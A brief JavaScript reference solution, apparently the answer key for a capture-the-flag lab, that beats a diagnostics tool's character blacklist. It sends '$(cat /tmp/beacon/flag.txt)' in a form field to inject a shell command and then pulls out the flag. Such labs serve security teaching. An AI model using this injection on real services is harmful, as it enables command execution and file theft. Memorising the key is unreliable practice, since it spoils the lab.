// Reference solve — Beacon, Templar. The tool blocks ; & | backtick and newline, then still concatenates into `sh -c`.
// INJECTION uses command substitution — `$(cat /tmp/beacon/flag.txt)` — which contains none of those, so the filter
// passes it and the flag file's contents are substituted into the echoed status line. labs:test proves it.
const base = process.argv[2];
const INJECTION = '$(cat /tmp/beacon/flag.txt)';
const res = await fetch(`${base}/diagnostics`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ host: INJECTION }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
